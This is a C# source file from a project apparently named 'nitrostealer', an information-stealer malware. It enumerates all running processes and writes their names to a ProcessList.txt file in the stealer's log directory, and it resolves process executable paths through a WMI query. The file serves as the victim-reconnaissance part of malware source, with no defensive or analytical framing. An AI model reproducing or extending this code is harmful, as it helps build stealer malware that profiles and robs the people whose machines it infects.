﻿using System.Diagnostics;
using System.IO;
using System.Management;

namespace nitrostealer
{
    class ProcessList
    {
        public static void WriteProcesses()
        {
            string Stealer_Dir = Help.LogPath;
            foreach (Process process in Process.GetProcesses())
            {
                File.AppendAllText(
                    Stealer_Dir + "\\ProcessList.txt", "" + process.ProcessName + "\n");
            }
        }
        public static string ProcessExecutablePath(Process process)
        {
            try
            {
                return process.MainModule.FileName;
            }
            catch
            {
                string query = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);

                foreach (ManagementObject item in searcher.Get())
                {
                    object id = item["ProcessID"];
                    object path = item["ExecutablePath"];

                    if (path != null && id.ToString() == process.Id.ToString())
                    {
                        return path.ToString();
                    }
                }
            }

            return "";
        }
    }
}
